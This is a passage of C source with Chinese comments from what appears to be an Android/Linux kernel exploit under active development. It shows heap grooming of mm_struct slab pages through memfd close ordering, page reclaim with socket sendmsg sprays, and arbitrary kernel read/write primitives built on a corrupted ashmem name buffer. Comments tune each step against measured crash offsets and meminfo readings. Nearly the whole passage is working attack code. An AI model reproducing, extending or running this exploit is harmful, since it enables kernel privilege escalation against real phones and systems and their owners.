       *   (3b) 逐关 pre_ctx[0..34]          -> base 页 36 -> 1（剩 child_leak）
       *        首次释放时 prior==NULL => 冻结 => 进 c->partial
       *        （35 个对象释放会制造大量冻结事件，但 base 页自身 inuse!=0，不 discard）
       *   (3c) close(leak_memfd)            -> child_leak mm_count 2->1 (其 exit 已 mmput, count 早为1)
       *        实际是 count 1->0 => free_mm => base 页 1 -> 0
       *        => 最后一次释放触发 slab_empty => 立即 discard => free_area[3] 队首 ✓
       */

      /* ---- (3a) 先关 post_ctx 与 spray：它们的页先 discard，压在最下面 ---- */
      {
        int n1 = 0;
        for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
          if (post_ctx.memfds[i] > 0) { SYSCHK(close(post_ctx.memfds[i])); post_ctx.memfds[i] = -1; n1++; }
        }
        int n2 = 0;
        for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
          if (spray_ctx.memfds[i] > 0) { SYSCHK(close(spray_ctx.memfds[i])); spray_ctx.memfds[i] = -1; n2++; }
        }
        ckpt_val("gk_se_p3a_post_closed", (long)n1);
        ckpt_val("gk_se_p3a_spray_closed", (long)n2);
      }
      ckpt_val("gk_se_after_p3a", meminfo_slab_kb());
      ckpt_val("gk_se_free_after_p3a", meminfo_free_kb());
      sched_yield();

      /* ---- (3b) 逐关 pre_ctx[0..34]：base 页 36 -> 1 ---- */
      ckpt_val("gk_se_before_p3b", meminfo_slab_kb());
      ckpt_val("gk_se_free_before_p3b", meminfo_free_kb());
      {
        int done = 0;
        for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
          if (pre_ctx.memfds[i] > 0) { SYSCHK(close(pre_ctx.memfds[i])); pre_ctx.memfds[i] = -1; done++; }
        }
        ckpt_val("gk_se_p3b_closed", (long)done);
      }
      ckpt_val("gk_se_after_p3b", meminfo_slab_kb());
      ckpt_val("gk_se_free_after_p3b", meminfo_free_kb());
      sched_yield();
      sched_yield();

      /* ---- (3c) 最后 release child_leak：base 页 1 -> 0 => slab_empty 队首 ---- */
      ckpt_val("gk_se_before_p3c", meminfo_slab_kb());
      ckpt_val("gk_se_free_before_p3c", meminfo_free_kb());
      if (leak_memfd > 0) {
        SYSCHK(close(leak_memfd));
        leak_memfd = -1;
      }
      ckpt_val("gk_se_leak_unpinned", 1);
      ckpt_val("gk_se_after_p3c", meminfo_slab_kb());
      ckpt_val("gk_se_free_after_p3c", meminfo_free_kb());

      /* 兜底：残留清零（应为 0） */
      {
        int rest = 0;
        for (size_t i = 0; i < post_ctx.mm_cnt; i++)
          if (post_ctx.memfds[i] > 0) { SYSCHK(close(post_ctx.memfds[i])); post_ctx.memfds[i] = -1; rest++; }
        for (size_t i = 0; i < pre_ctx.mm_cnt; i++)
          if (pre_ctx.memfds[i] > 0) { SYSCHK(close(pre_ctx.memfds[i])); pre_ctx.memfds[i] = -1; rest++; }
        for (size_t i = 0; i < spray_ctx.mm_cnt; i++)
          if (spray_ctx.memfds[i] > 0) { SYSCHK(close(spray_ctx.memfds[i])); spray_ctx.memfds[i] = -1; rest++; }
        ckpt_val("gk_se_rest_closed", (long)rest);
      }
      ckpt_val("gk_se_ctx_all_closed", 1);
      ckpt_val("gk_se_after_p2", meminfo_slab_kb());
      ckpt_val("gk_se_free_after_p2", meminfo_free_kb());
      /* 兼容旧脚本观测点名字 */
      ckpt_val("slab_after_leak_unpin", meminfo_slab_kb());
      ckpt_val("slab_after_ctx_late_close", meminfo_slab_kb());
      ckpt_val("free_after_ctx_late_close", meminfo_free_kb());
      sched_yield();
    } else {
      /* ---- 旧逻辑（gK108/A150）：保留作为回退基线 ---- */
      if (leak_memfd > 0) {
        SYSCHK(close(leak_memfd));
        leak_memfd = -1;
      }
      ckpt_val("g108_leak_unpinned", 1);
      ckpt_val("slab_after_leak_unpin", meminfo_slab_kb());
      for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
        if (post_ctx.memfds[i] > 0) {
          SYSCHK(close(post_ctx.memfds[i]));
          post_ctx.memfds[i] = -1;
        }
      }
      for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
        if (pre_ctx.memfds[i] > 0) {
          SYSCHK(close(pre_ctx.memfds[i]));
          pre_ctx.memfds[i] = -1;
        }
      }
      for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
        if (spray_ctx.memfds[i] > 0) {
          SYSCHK(close(spray_ctx.memfds[i]));
          spray_ctx.memfds[i] = -1;
        }
      }
      ckpt_val("g108_ctx_all_closed", 1);
      ckpt_val("slab_after_ctx_late_close", meminfo_slab_kb());
      ckpt_val("free_after_ctx_late_close", meminfo_free_kb());
      sched_yield();
      if (pref_pids) {
        ckpt_val("free_before_late_kill2", meminfo_free_kb());
        for (int i = 0; i < pref_n; i++) {
          kill(pref_pids[i], SIGKILL);
          waitpid(pref_pids[i], NULL, 0);
        }
        ckpt_val("g108_late_kill2_total", (long)pref_n);
        free(pref_pids);
        pref_pids = NULL;
        ckpt_val("slab_after_late_kill2", meminfo_slab_kb());
        ckpt_val("free_after_late_kill2", meminfo_free_kb());
        sched_yield();
        sched_yield();
      }
    }
  }
  /* ===== gK104 (A126)：base 页最后进 buddy =====
   * 若 GK_PRE_CTX_AFTER_KILL=1，此处才 close(pre_ctx.memfds)：
   *   此时 700 线程已被 kill（制造了 unfreeze 压力），base 页所在 slab
   *   仍 inuse>0（因 mm_count 未归零）。close 后 base 页 inuse→0
   *   ⇒ 最后进入 buddy ⇒ list_add(HEAD) ⇒ 下一次 order-3 分配即拿到它。
   */
  if (env_flag("GK_PRE_CTX_AFTER_KILL", 0)) {
    ckpt_val("free_before_ctx_after_kill", meminfo_free_kb());
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      if (pre_ctx.memfds[i] > 0) {
        SYSCHK(close(pre_ctx.memfds[i]));
        pre_ctx.memfds[i] = -1;
      }
    }
    ckpt_val("g104_ctx_close_after_kill", 1);
    ckpt_val("slab_after_ctx_after_kill", meminfo_slab_kb());
    ckpt_val("free_after_ctx_after_kill", meminfo_free_kb());
  }
  /* ===== 重建141（gK38）：reclaim 次数可配 + 统计实际占用 =====
   * SKB_RECLAIM_SENDS 从 4 提到 GK38_SENDS（默认 32），配合上面的 sndbuf=8MB。
   * 32 次 x 64KB = 2MB，仍在 8MB sndbuf 内。
   * 统计成功次数与总字节，用于判断重占规模是否足够。 */
  int reclaim_sends = env_int_range("GK38_SENDS", 32, 1, 256);
  int reclaim_ok = 0;
  long reclaim_bytes = 0;
  /* gK92: round-robin across sockets. Each socket has its own 16MB
   * sk_sndbuf so each reaches ~251 sends independently; interleaving keeps
   * the temporal pattern close to the old single-socket path. */
  int sends_done[MAX_RECLAIM_SOCKETS];
  for (int si = 0; si < MAX_RECLAIM_SOCKETS; si++) sends_done[si] = 0;
  /* gK115：每个 socket 主攻上限。
   * [源码] sock_setsockopt SO_SNDBUF: sk_sndbuf = max(val*2, min)。
   *   val 被钳到 wmem_max=8MB ⇒ sk_sndbuf = 16MB ⇒ 16MB/64KB = 256（实测 251）。
   * [预算] 总容量 C = sockets * 251。warmup 已消耗 gk106_warmup_ok 次。
   *   主攻剩余 = C - warmup，按 sockets 均分。
   *   gK114 时 8*251-2001 = 7（与实测 g38_reclaim=7 完全吻合 ✓）。
   *   gK115 时 24*251-2001 = 4023 ⇒ 覆盖 4023 个 order-3 页 >> 460 候选页。
   */
  int reclaim_per_sock = 251;
  for (int i = 0; i < reclaim_sends; i++) {
    int round_progress = 0;
    for (int si = 0; si < reclaim_sockets; si++) {
      if (sends_done[si] >= reclaim_per_sock) continue;
      errno = 0;
      ssize_t sent = sendmsg(reclaim_sv[si][0], &msg, MSG_DONTWAIT);
      if (sent <= 0) {
        if (sends_done[si] == 0)
          pr_warning("GK38: sock%d sendmsg failed at 0 errno=%d\n", si, errno);
        sends_done[si] = reclaim_sends;
        continue;
      }
      sends_done[si]++;
      reclaim_ok++;
      reclaim_bytes += (long)sent;
      round_progress = 1;
    }
    if (!round_progress) break;
  }
  {
    int mn = reclaim_sends, mx = 0;
    for (int si = 0; si < reclaim_sockets; si++) {
      if (sends_done[si] < mn) mn = sends_done[si];
      if (sends_done[si] > mx) mx = sends_done[si];
    }
    pr_info("GK38: sockets=%d sends/sock min=%d max=%d\n", reclaim_sockets, mn, mx);
  }
  pr_info("GK38: reclaim sends=%d/%d bytes=%ld (%.2f MiB) order3_pages~%ld\n",
          reclaim_ok, reclaim_sends, reclaim_bytes,
          (double)reclaim_bytes / (1024.0 * 1024.0),
          (long)(reclaim_bytes / (long)ORDER3_SIZE));
  /* ===== 重建141（gK38）：返回前把关键几何写入 ckpt.log =====
   * ckpt 是 O_APPEND+fsync，崩溃后仍可读；stdout 在 ADB 断连时会丢。
   * 判据（下一次崩溃时）：
   *   KE=trylock+0x1c  -> base 页未映射（skb 没占到）
   *   KE=+0x65c        -> base 页已映射（占到了，只是内容/偏移不对） */
  ckpt_val("g38_base", (long)base);
  ckpt_val("g38_phys", (long)((uint64_t)base - (uint64_t)P0_PAGE_OFFSET));
  ckpt_val("g38_fake_lock", (long)fake_lock);
  ckpt_val("g38_lock_off", (long)LOCK_OFF);
  ckpt_val("g38_reclaim", (long)reclaim_ok);
  /* gK87 观测点 C：reclaim 之后 */
  ckpt_val("slab_after_reclaim", meminfo_slab_kb());
  ckpt_val("sunreclaim_after_reclaim", meminfo_sunreclaim_kb());
  ckpt_val("free_after_reclaim", meminfo_free_kb());
  kernelsnitch_cleanup(ks);
  ks = NULL;

  /* gK86：prepare_ctx 已在 reclaim 之前释放（见上方），此处不再重复 close/kill。
   * 重复执行会 close 已关闭的 fd（memfds[i] 已是 -1）并 kill 已回收的 pid。 */

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = env_int_range("FOPS_MAX_ATTEMPTS", 24, 4, 72);
  }
  /* ===== 重建135（gK35）：retry 改为「按次数」控制，不再用 180s 墙钟 =====
   * [实测] r122/gK34 只跑了 1 次就退出：因为单次 prepare_kernel_page 内
   *   KernelSnitch 要扫 64GiB（= 64 个 COARSE_SZ 段 x 每段 2^15 个 slab），
   *   一次就吃掉 180s 以上，deadline 立刻到期 -> break，永远只有 1 次机会。
   * 而 DRAM guard 会把「phys_off >= limit」的 bogus 候选判失败返回 0，
   * 必须靠多次重试才有机会撞到 DRAM 内的合法地址。
   * 改为：纯按 max_attempts 次数循环，每次打印 attempt/phys 信息，
   *   另设一个总时长上限（GK35_BUDGET 秒，默认 900）防止无限卡住。 */
  int budget_sec = env_int_range("GK35_BUDGET", 900, 60, 7200);
  struct timespec t0, now;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      pr_info("prepare_kernel_page ok attempt=%d/%d\n", attempt, max_attempts);
      return base;
    }
    clock_gettime(CLOCK_MONOTONIC, &now);
    long elapsed = (long)(now.tv_sec - t0.tv_sec);
    if (elapsed >= budget_sec) {
      pr_warning("prepare_kernel_page budget exhausted (%lds) after %d attempts\n",
                 elapsed, attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d (elapsed %lds, budget %ds)\n",
               attempt, max_attempts, elapsed, budget_sec);
  }
  pr_warning("prepare_kernel_page gave up after %d attempts\n", max_attempts);
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

/* Accessor functions used by fops.c */
uintptr_t pselect_write_value(void) {
  return pselect_custom_value;
}
uintptr_t pselect_write_target(void) {
  return pselect_custom_target;
}
int pselect_custom_write_enabled(void) {
  return pselect_custom_write;
}
int pselect_write_shape(void) {
  return 1;
}
void set_pselect_write(uintptr_t target, uintptr_t value) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = 1;
}

/* Environment variable helpers used by fops.c */
int env_flag(const char *name, int def) {
  char *v = getenv(name);
  if (!v) return def;
  return atoi(v);
}

int env_int_range(const char *name, int def, int min, int max) {
  char *v = getenv(name);
  if (!v) return def;
  int val = (int)strtol(v, NULL, 0);
  if (val < min) return min;
  if (val > max) return max;
  return val;
}

unsigned long env_ulong(const char *name, unsigned long def) {
  char *v = getenv(name);
  if (!v) return def;
  return strtoul(v, NULL, 0);
}

/* ---- crash checkpoint log -----------------------------------------------
 * Kernel logs (dmesg/pstore/last_kmsg) are unreadable from the shell domain
 * on this device, so a hang/panic leaves no trace. Write a small user-space
 * breadcrumb to a file that SURVIVES a watchdog reset: open with O_APPEND,
 * write, fsync, close on every step. If the device reboots, the last line
 * without a matching "end" pinpoints the syscall that wedged the kernel. */
static const char *ckpt_path(void) {
  const char *p = getenv("CKPT");
  return p ? p : "/data/local/tmp/ckpt.log";
}
static int ckpt_fd = -1;
void ckpt_open(void) {
  if (ckpt_fd >= 0) return;
  ckpt_fd = open(ckpt_path(), O_WRONLY | O_CREAT | O_APPEND, 0644);
}
void ckpt_close(void) {
  if (ckpt_fd >= 0) { close(ckpt_fd); ckpt_fd = -1; }
}
static void ckpt_write_line(const char *tag) {
  if (ckpt_fd < 0) ckpt_open();
  if (ckpt_fd < 0) return;
  char buf[256];
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  int n = snprintf(buf, sizeof(buf), "%ld.%03ld tid=%d %s\n",
                   (long)ts.tv_sec, ts.tv_nsec / 1000000,
                   (int)syscall(SYS_gettid), tag);
  if (n > 0) {
    ssize_t w = write(ckpt_fd, buf, (size_t)n);
    (void)w;
    fsync(ckpt_fd);
  }
}
void ckpt_begin(const char *tag) {
  char buf[192];
  snprintf(buf, sizeof(buf), "BEGIN %s", tag);
  ckpt_write_line(buf);
}
void ckpt_end(const char *tag) {
  char buf[192];
  snprintf(buf, sizeof(buf), "END   %s", tag);
  ckpt_write_line(buf);
}
/* CKPTVAL: durable key=value record (write + fsync). */
void ckpt_val(const char *key, long val) {
  char buf[192];
  snprintf(buf, sizeof(buf), "VAL   %s = %ld (0x%lx)", key, val, (unsigned long)val);
  ckpt_write_line(buf);
}
void ckpt_str(const char *key, const char *s) {
  char buf[192];
  snprintf(buf, sizeof(buf), "STR   %s = %s", key, s ? s : "(null)");
  ckpt_write_line(buf);
}
/* ===== gK87（A23）：SLUB 侧面观测量 =====
 * /sys/kernel/slab/mm_struct/* 需 root，实测 Permission denied；
 * /proc/meminfo 的 Slab / SUnreclaim 普通用户可读（A 级实测）。
 * mm_struct 属于 SUnreclaim，记录四点对照可判断 discard 是否发生。 */
long meminfo_slab_kb(void) {
  FILE *f = fopen("/proc/meminfo", "r");
  if (!f) return -1;
  char line[256];
  long v = -1;
  while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "Slab:", 5) == 0) { v = strtol(line + 5, NULL, 10); break; }
  }
  fclose(f);
  return v;
}
long meminfo_sunreclaim_kb(void) {
  FILE *f = fopen("/proc/meminfo", "r");
  if (!f) return -1;
  char line[256];
  long v = -1;
  while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "SUnreclaim:", 11) == 0) { v = strtol(line + 11, NULL, 10); break; }
  }
  fclose(f);
  return v;
}
/* ===== gK102 (A122)：MemFree 观测 =====
 * [为何必须加] slab_* 判据被噪声淹没：700 个线程的内核栈(16KB/线程)≈12MB，
 *   而 base 页只有 32KB，完全看不出变化。实测 slab_after_pre_ctx_release
 *   与 slab_after_pre_fork 完全相同(349024)，无法判断 base 页归属。
 * [原理] base 页回到 buddy ⇒ zone free_area 增加 32KB ⇒ MemFree +32KB。
 *   sendmsg 抢走它 ⇒ MemFree -32KB。
 *   ⇒ MemFree 的"先升后降"是 base 页回 buddy 再被抢走的直接证据。 */
long meminfo_free_kb(void) {
  FILE *f = fopen("/proc/meminfo", "r");
  if (!f) return -1;
  char line[256];
  long v = -1;
  while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "MemFree:", 8) == 0) { v = strtol(line + 8, NULL, 10); break; }
  }
  fclose(f);
  return v;
}
